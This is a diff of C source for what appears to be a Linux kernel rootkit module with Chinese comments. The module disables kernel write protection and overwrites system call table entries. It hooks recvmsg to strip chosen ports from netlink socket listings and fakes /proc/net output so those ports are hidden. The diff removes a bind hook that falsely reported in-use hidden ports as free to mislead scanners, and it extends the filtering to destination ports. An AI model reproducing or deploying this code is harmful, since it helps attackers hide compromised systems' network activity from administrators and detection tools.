@@ -256,11 +256,9 @@ bool get_connect_param(const char* str,int *port,int *type){
 int hide_connect_init(void **real_sys_call_table){
     // 获取真实的recvmsg函数地址(用于ss)
     real_sys_recvmsg = real_sys_call_table[__NR_recvmsg];
-    real_sys_bind = real_sys_call_table[__NR_bind];
     // 关闭写保护
     disable_wp();
     real_sys_call_table[__NR_recvmsg] = my_sys_recvmsg;
-    real_sys_call_table[__NR_bind] = my_sys_bind;
     // 开启写保护
     enable_wp();
 
@@ -290,7 +288,6 @@ int hide_connect_exit(void **real_sys_call_table){
     disable_wp();
     // 将之前hook的函数修改回去
     real_sys_call_table[__NR_recvmsg] = real_sys_recvmsg;
-    real_sys_call_table[__NR_bind] = real_sys_bind;
     enable_wp();
 
     // 将之前hook的函数修改回去
@@ -374,7 +371,7 @@ int fake_seq_show(struct seq_file *seq, void *v){
         if (type == node->type){
             // seq->buf为缓冲区,snprintf先按照缓冲区格式声明一个port_str_buf
             snprintf(port_str_buf, PORT_STR_LEN, ":%04X", node->port);
-            // 之后将缓冲区的新增长度和port_str_buf进行对比,如果对比成功,则说明这就是要过滤的端口号
+            // 之后将缓冲区的新增字符串和port_str_buf进行对比,如果对比成功,则说明这就是要过滤的端口号
             if (strnstr(seq->buf + last_len, port_str_buf, this_len)){
                 pr_info("Hiding port: %d", node->port);
                 seq->count = last_len;
@@ -486,7 +483,7 @@ static ssize_t my_sys_recvmsg(const struct pt_regs *regs){
 
 static bool data_should_be_masked(struct nlmsghdr *nlh){
     struct inet_diag_msg *r;
-    int port;
+    int sport,dport;
     struct port_node *node = NULL;
 
     /* NLMSG_DATA: Given a netlink header structure, this macro returns
@@ -494,49 +491,13 @@ static bool data_should_be_masked(struct nlmsghdr *nlh){
     r = NLMSG_DATA(nlh);
 
     /* From the ancilliary data extract the port associated with the socket identity */
-    port = ntohs(r->id.idiag_sport);
+    sport = ntohs(r->id.idiag_sport);
+    dport = ntohs(r->id.idiag_dport);
 
     list_for_each_entry(node, &hidden_port_list_head, list){
-        // 未判断协议类型
-        if (port == node->port){
+        if (sport == node->port || dport == node->port){
             return true;
         }
     }
     return false;
-}
-
-// 如果 bind 时出现 EADDRINUSE, 并且该端口是隐藏端口，则返回该端口未使用，用于欺骗扫描器
-static long my_sys_bind(const struct pt_regs *regs)
-{
-    long ret;
-    int port;
-    struct sockaddr_in sockaddr;
-    struct port_node *node = NULL;
-    ret = real_sys_bind(regs);
-
-    if ((int)ret == -EADDRINUSE && regs->dx >= sizeof(struct sockaddr_in))
-    {
-        if (copy_from_user(&sockaddr, (void *)regs->si, regs->dx) == 0)
-        {            
-            if (sockaddr.sin_family == AF_INET || sockaddr.sin_family == AF_INET6)
-            {
-                port = ntohs(sockaddr.sin_port);
-                pr_info("my_sys_bind: %d", port);
-                list_for_each_entry(node, &hidden_port_list_head, list)
-                {
-                    if (port == node->port)
-                    {
-                        pr_info("avoid detect port:%d", port);
-                        ret = 0;
-                        break;
-                    }
-                }
-            }
-        }
-        else
-        {
-            pr_info("copy_from_user fail.", port);
-        }
-    }
-    return ret;
 }
